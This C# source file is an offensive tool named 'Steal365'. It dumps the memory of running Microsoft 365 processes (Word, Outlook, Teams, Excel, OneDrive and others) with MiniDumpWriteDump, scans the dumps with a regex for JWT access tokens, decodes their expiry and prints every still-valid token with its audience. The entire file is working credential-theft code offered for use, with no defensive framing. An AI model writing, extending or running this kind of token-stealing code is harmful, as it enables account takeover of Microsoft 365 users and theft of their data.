using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;

using static Steal365.Class1;

namespace Steal365
{
    public class Program
    {
        static byte[] SafetyDump(string pName)
        {
            // https://github.com/riskydissonance/SafetyDump

            uint targetProcessId;
            IntPtr targetProcessHandle;

            try
            {
                Process proc = Process.GetProcessesByName(pName)[0];
                targetProcessId = (uint)proc.Id;
                targetProcessHandle = proc.Handle;
            }
            catch
            {
                Console.WriteLine($"    - {pName} not found!\n");
                return null;
            }

            try
            {
                var byteArray = new byte[60 * 1024 * 1024];
                var callbackPtr = new MinidumpCallbackRoutine((param, input, output) =>
                {
                    var inputStruct = Marshal.PtrToStructure<MINIDUMP_CALLBACK_INPUT>(input);
                    var outputStruct = Marshal.PtrToStructure<MINIDUMP_CALLBACK_OUTPUT>(output);
                    switch (inputStruct.CallbackType)
                    {
                        case MINIDUMP_CALLBACK_TYPE.IoStartCallback:
                            outputStruct.status = HRESULT.S_FALSE;
                            Marshal.StructureToPtr(outputStruct, output, true);
                            return true;
                        case MINIDUMP_CALLBACK_TYPE.IoWriteAllCallback:
                            var ioStruct = inputStruct.Io;
                            if ((int)ioStruct.Offset + ioStruct.BufferBytes >= byteArray.Length)
                            {
                                Array.Resize(ref byteArray, byteArray.Length * 2);
                            }
                            Marshal.Copy(ioStruct.Buffer, byteArray, (int)ioStruct.Offset, ioStruct.BufferBytes);
                            outputStruct.status = HRESULT.S_OK;
                            Marshal.StructureToPtr(outputStruct, output, true);
                            return true;
                        case MINIDUMP_CALLBACK_TYPE.IoFinishCallback:
                            outputStruct.status = HRESULT.S_OK;
                            Marshal.StructureToPtr(outputStruct, output, true);
                            return true;
                        default:
                            return true;
                    }
                });

                var callbackInfo = new MINIDUMP_CALLBACK_INFORMATION
                {
                    CallbackRoutine = callbackPtr,
                    CallbackParam = IntPtr.Zero
                };

                var size = Marshal.SizeOf(callbackInfo);
                var callbackInfoPtr = Marshal.AllocHGlobal(size);
                Marshal.StructureToPtr(callbackInfo, callbackInfoPtr, false);

                if (MiniDumpWriteDump(targetProcessHandle, targetProcessId, IntPtr.Zero, (uint)2, IntPtr.Zero, IntPtr.Zero, callbackInfoPtr))
                {
                    return byteArray;

                }
                Console.WriteLine("  [-] Dump failed");
                Console.WriteLine(Marshal.GetLastWin32Error());
                return null;
            }
            catch (Exception e)
            {
                Console.WriteLine("  [-] Exception dumping process memory");
                Console.WriteLine($"\n  [-] {e.Message}\n{e.StackTrace}");
                return null;
            }
        }

        static List<string> GetTokens(byte[] dump)
        {
            try
            {
                string data = Encoding.UTF8.GetString(dump);
                var tokens = new List<string>();
                string pattern = @"\beyJ0eX[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\b";
                foreach (Match match in Regex.Matches(data, pattern))
                {
                    tokens.Add(match.ToString());
                }
                List<string> unique = new HashSet<string>(tokens).ToList();
                return unique;
            }
            catch
            {
                return new List<string>();
            }
        }

        static void CheckToken(List<string> tokens)
        {
            foreach (var token in tokens)
            {
                var payload = token.Split('.')[1];

                while ((payload.Length % 4) != 0)
                {
                    payload += "=";
                }

                var json = Encoding.UTF8.GetString(Convert.FromBase64String(payload));

                var match = Regex.Match(json, @"""exp"":\s*(\d+)");
                long exp = long.Parse(match.Groups[1].Value);

                if (exp > DateTimeOffset.Now.ToUnixTimeSeconds())
                {
                    DateTimeOffset dateTimeOffset = DateTimeOffset.FromUnixTimeSeconds(exp);
                    DateTime dateTime = dateTimeOffset.LocalDateTime;

                    Console.WriteLine($"    + Valid token: {dateTime}");

                    match = Regex.Match(json, @"""aud"":\s*""([^""]+)""");
                    Console.WriteLine($"    + aud: {match.Groups[1].Value}");

                    Console.WriteLine($"    + Token: {token}\n");
                }
            }
        }

        public static void Main(string[] args) 
        {
            Console.WriteLine("\n      --++[   Steal365   ]++--\n");

            var procs = new List<string> { "WINWORD", "onenoteim", "ONENOTEM", "ms-teams", "POWERPNT", "OUTLOOK", "EXCEL", "OneDrive" };

            foreach (string p in procs) 
            {
                Console.WriteLine($"[>] try dump: {p}");
                byte[] dump = SafetyDump(p);
                
                if (dump != null) 
                {
                    Console.WriteLine($"  \\-- dump {p} ok");
                    Console.WriteLine($"  \\-- looking for tokens...");

                    var tokens = GetTokens(dump);

                    if (tokens.Any())
                    {
                        CheckToken(tokens);
                    }
                    else
                    {
                        Console.WriteLine($"    - no tokens\n");
                    }
                }
            }
        }
    }
}
